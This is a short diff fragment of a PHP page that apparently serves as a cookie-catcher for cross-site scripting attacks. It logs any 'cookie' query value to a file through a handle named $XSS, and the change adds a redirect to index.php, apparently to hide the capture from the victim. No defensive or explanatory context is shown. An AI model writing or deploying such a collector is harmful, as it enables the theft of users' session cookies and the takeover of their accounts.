@@ -14,6 +14,8 @@ if(isset($_GET['cookie']) && !empty($_GET['cookie'])){
     fwrite($XSS, $_GET['cookie']);
     fclose($XSS);
 }
+
+header('location: index.php');
 ?>
 </body>
 </html>
